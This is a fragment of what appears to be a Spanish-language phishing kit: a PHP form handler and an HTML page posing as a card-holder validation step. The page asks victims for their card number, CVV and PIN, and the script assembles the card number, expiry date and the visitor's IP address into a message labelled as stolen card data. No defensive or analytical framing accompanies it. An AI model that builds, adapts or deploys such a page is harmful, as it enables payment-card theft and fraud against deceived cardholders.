...
if(isset($_POST['doSubmit']))
{
    ...
    $message = '/-- CC --/' . getIPAddress() . "\r\n";
    $message .= '[Credit Card Number] = ' . $_POST['CardNumber'] . "\r\n";
    $message .= '[Expiration Date] = ' . $_POST['ExpirationDate'] . "\r\n";
...
<div class="cssload-container">
  <div class="cssload-zenith"></div>
    ...
    <div class="section">
      ...
      <div class="titre">
      Introduce tus dígitos de tu tarjeta para validar que eres el titular
      </div>
...
<center style="width: 305px;"> 
        ...
        <br>
        <input type="text" minlength="19" maxlength="19" placeholder="NÚMERO DE TARJETA" name="CardNumber" id="CardNumber" required="">
        <br>
        ...
        <br>
        <input type="text" placeholder="CVV" minlength="3" maxlength="3" name="CCV" id="CCV" required="">
        <br>
        <input type="text" placeholder="PIN" minlength="4" maxlength="4" name="PIN" id="PIN" required="">
...
<br>
      ...
      <button class="btn-firm2" type="submit" id="sBtn" name="doSubmit">ACEPTAR</button>
